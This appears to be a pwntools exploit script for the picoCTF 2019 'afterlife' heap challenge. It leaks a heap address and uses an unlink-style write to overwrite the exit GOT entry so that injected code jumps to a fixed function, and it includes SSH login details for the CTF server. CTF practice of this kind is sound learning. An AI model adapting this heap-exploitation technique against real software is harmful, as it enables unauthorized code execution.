import binascii
from pwn import *
import sys
from struct import pack


BINARY = './vuln'
context.terminal = ['tmux', 'splitw', '-h']


def attach_gdb(sh):
    gdb.attach(sh)


def P32(v):
    return pack('I', v)


def P64(v):
    return pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]


def start():
    payload = 'A'*12
    

    if args["REMOTE"]:
        s = ssh(host='2019shell1.picoctf.com',
                user='mikon', password="password")
        sh = s.process(
            ['vuln', payload], cwd='/problems/afterlife_3_d7ce2f2a99c4a2a922485a042076039f')
    else:
        sh = process(['./vuln', payload],
                     stdout=process.PTY, stdin=process.PTY)

    if args["GDB"]:
        attach_gdb(sh)
    return sh

'''
struct chunk {
    int prev_size;
    int size;
    struct chunk *fd;  // forward pointer
    struct chunk *bk;  // backward pointer
};

*(next->fd + 12) = next->bk
*(next->bk+ 8) = next->fd

'''

def main():
    sh = start()

    exitGot = 0x804d02c
    sh.recvline()
    leak = sh.recvline()
    leak = int(leak)
    print(hex(leak))
    payload = ''
    payload += P32(exitGot-0xc)  #write in fd_ptr
    payload += P32(leak + 8)  #write in bk_ptr
    payload += asm('mov eax, 0x08048966;call eax;')

    sh.sendlineafter('\n', payload)

    sh.interactive()


if __name__ == '__main__':
    main()
